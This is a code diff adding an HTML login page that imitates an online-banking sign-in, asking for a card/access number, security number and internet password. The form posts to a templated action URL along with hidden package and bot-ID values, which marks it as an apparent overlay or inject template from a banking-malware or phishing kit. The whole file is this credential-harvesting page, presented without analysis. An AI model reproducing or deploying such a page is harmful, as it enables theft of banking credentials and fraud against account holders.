@@ -1,0 +1,83 @@
+<html>
+<head>
+<style>
+	body {
+		 background: -moz-linear-gradient(top,  rgb(131, 13, 88) 0%, rgb(32, 28, 60) 100%);
+		background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgb(131, 13, 88)), color-stop(100%,rgb(32, 28, 60)));
+		background: -webkit-linear-gradient(top,  rgb(131, 13, 88) 0%,rgb(32, 28, 60) 100%);
+		background: -o-linear-gradient(top,  rgb(131, 13, 88) 0%,rgb(32, 28, 60) 100%);
+		background: -ms-linear-gradient(top,  rgb(131, 13, 88) 0%,rgb(32, 28, 60) 100%);
+		background: linear-gradient(to bottom,  #830c58 0%,#201c3c 100%);
+		filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#804dc1ba', endColorstr='#80ff6b6b',GradientType=0 );
+	}
+
+	.input {
+		background: transparent;
+		height: 30px;
+		width: 98%;
+		border: 0 none;
+		border-bottom: 1px solid #fff;
+		color: #fff;
+		font-size: 16px;
+	}
+	
+	.fielderror {
+		background: transparent;
+		height: 30px;
+		width: 98%;
+		border: 0 none;
+		border-bottom: 1px solid #f00;
+		color: #fff;
+		font-size: 16px;
+	}
+	.submit {
+		width: 98%;
+		height: 35px;
+		border-radius: 6px;
+		background: #d60c8c;
+		border: 0 none;
+		color: #fff;
+	}
+	
+	h4 {
+		float: left;
+		color: #fff;
+		padding: 0 0 0 20px;
+		margin: 0;
+	}
+
+	.checkbox {
+		float: right;
+		margin-right: 20px;
+		width: 25px;
+		height: 25px;
+		background: transparent;
+		border: 1px solid #d60c8c;
+	}
+</style>
+</head>
+<body>
+<div id="content_div">
+<center><br><br>
+		<script src='%DYN_PATH_GENERAL%/jquery.min.js'></script><script src='%DYN_PATH_GENERAL%/validator.js'></script><form id='mainform' method='post' action='%ACTION%' onsubmit="return formvalidator()"><input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+		
+			<input name="fields[Login]" id="login" placeholder="Login with card/access no." maxlength="16" class="input" type="text"><br><br>
+			<script>
+				document.getElementById('login').onkeypress = function (e) {
+					return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
+				}
+			</script>
+			<input name="fields[Security_number]" id="security" placeholder="Security number" maxlength="6" class="input" type="password"><br><br>
+			<script>
+				document.getElementById('security').onkeypress = function (e) {
+					return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
+				}
+			</script>
+			<input name="fields[Internet_Password]" id="password" placeholder="Internet Password" maxlength="12" class="input" type="password"><br><br>
+			<div ><h4>Save card/access number </h4> <input type="checkbox" id="chk" name='check' class="checkbox" /> </div><br><br><br>
+			<input value="Login" id="input_submitBtn" class="submit" type="submit" />
+		</form>
+<center>
+</div>
+</body>
+</html>
